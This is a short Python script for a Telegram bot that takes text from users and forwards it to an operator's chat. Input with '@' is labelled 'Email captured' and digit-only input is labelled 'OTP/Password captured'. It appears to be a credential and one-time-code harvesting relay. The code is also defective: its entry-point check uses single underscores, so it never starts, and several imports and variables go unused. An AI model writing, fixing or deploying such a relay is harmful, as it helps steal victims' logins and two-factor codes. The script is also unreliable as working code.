import os
import re
import random
import requests
import phonenumbers
import pycountry
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters

# Load environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
USERNAME = os.getenv("USERNAME")
PASSWORD = os.getenv("PASSWORD")
BASE_URL = os.getenv("BASE_URL")


# Function to generate random code
def generate_code():
    return random.randint(100000, 999999)


# Function to clean text
def clean_text(text):
    return re.sub(r'[^a-zA-Z0-9+@._-]', '', text)


# Function to send Telegram message
def send_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=payload)


# Start command
def start(update, context):
    update.message.reply_text("✅ Bot is running successfully on Railway!")


# Handle incoming messages
def handle_message(update, context):
    text = clean_text(update.message.text)

    if "@" in text:
        send_message(f"📧 Email captured: {text}")
    elif text.isdigit():
        send_message(f"🔑 OTP/Password captured: {text}")
    else:
        send_message(f"📩 Message received: {text}")


# Main function
def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    updater.start_polling()
    updater.idle()


if _name_ == "_main_":
    main()
